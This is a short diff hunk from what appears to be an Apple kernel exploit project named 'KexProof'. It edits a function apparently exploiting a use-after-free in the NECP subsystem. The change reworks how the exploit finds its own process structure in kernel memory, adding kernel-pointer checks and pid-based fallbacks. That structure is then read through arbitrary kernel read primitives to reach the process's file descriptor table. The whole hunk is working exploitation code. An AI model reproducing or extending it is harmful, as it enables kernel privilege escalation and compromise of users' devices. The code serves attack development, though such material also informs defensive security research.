@@ -4127,8 +4127,10 @@ static long kpNecpUafExecute(int fd, const uint8_t *clientUUID,
             extern uint64_t kp_rc_kread64(uint64_t);
             uint8_t *resD = calloc(1, KP_NECP_COPY_SZ);
             long rd0 = kpNecpAction(fd, KP_NECP_COPY_RESULT, (void *)uuid, 16, resD, KP_NECP_COPY_SZ);
-            uint64_t selfProc = [self findProcByCommName:getprogname() log:r];
-            if (!selfProc) selfProc = [self findProcByCommName:"KexProof" log:r];
+            uint64_t selfProc = proc_self();
+            if (!kpLooksLikeKernelPointer(selfProc)) selfProc = [self findSelfProcByPidFast:(uint32_t)getpid() log:r];
+            if (!selfProc) selfProc = [self findSelfProcByComm:r];
+            if (!selfProc) selfProc = [self findProcByPid:(uint32_t)getpid() log:r];
             uint64_t fdPtr = 0;
             kpRead(selfProc + koffsetof(proc, fd), &fdPtr, 8, "proc.fd", r);
             uint64_t fdTable = kp_untag_ptr(fdPtr);
